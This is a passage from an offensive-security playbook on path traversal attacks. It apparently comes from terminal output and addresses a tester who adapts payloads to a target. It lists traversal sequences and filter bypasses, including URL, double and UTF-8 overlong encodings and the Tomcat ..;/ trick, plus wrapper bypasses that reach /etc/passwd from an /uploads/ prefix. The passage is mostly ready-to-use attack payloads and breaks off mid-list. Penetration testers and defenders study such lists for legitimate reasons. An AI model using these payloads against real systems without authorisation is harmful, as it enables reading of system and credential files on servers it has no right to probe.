[34m│[0m ## Path Traversal Attack Playbook                                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m > **IMPORTANT:** All payloads in this playbook are EXAMPLES that must be     [34m│[0m
[34m│[0m MODIFIED for your specific target. Replace placeholders like `{FILE_PATH}`,  [34m│[0m
[34m│[0m `{DEPTH}`, `{TARGET_FILE}` with actual values. Adapt payloads based on:      [34m│[0m
[34m│[0m > - Target operating system (Unix/Linux vs Windows)                          [34m│[0m
[34m│[0m > - Web server and application framework                                     [34m│[0m
[34m│[0m > - Path normalization behavior                                              [34m│[0m
[34m│[0m > - Discovered file locations and depth                                      [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Path Normalization Reasoning                                             [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **THINK ABOUT PATH PROCESSING:**                                             [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m 1. **WHAT NORMALIZES THE PATH?**                                             [34m│[0m
[34m│[0m    - OS filesystem                                                           [34m│[0m
[34m│[0m    - Web server (Apache, nginx)                                              [34m│[0m
[34m│[0m    - Application framework                                                   [34m│[0m
[34m│[0m    - Custom code                                                             [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Traversal Sequence Variations                                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ../ (Unix standard)                                                          [34m│[0m
[34m│[0m ..\ (Windows)                                                                [34m│[0m
[34m│[0m ....// (double-dot removal bypass)                                           [34m│[0m
[34m│[0m ..;/ (Tomcat path parameter)                                                 [34m│[0m
[34m│[0m ..\/ (mixed separator)                                                       [34m│[0m
[34m│[0m ..%2f (URL encoded)                                                          [34m│[0m
[34m│[0m ..%5c (URL encoded backslash)                                                [34m│[0m
[34m│[0m %2e%2e%2f (full URL encode)                                                  [34m│[0m
[34m│[0m %252e%252e%252f (double encode)                                              [34m│[0m
[34m│[0m ..%c0%af (UTF-8 overlong)                                                    [34m│[0m
[34m│[0m ....\/....\ (mixed bypass)                                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Wrapper Bypass                                                           [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **If path MUST start with /uploads/:**                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m /uploads/../../../etc/passwd                                                 [34m│[0m
[34m│[0m /uploads/..%2f..%2f..%2fetc/passwd                                           [34m│[0m
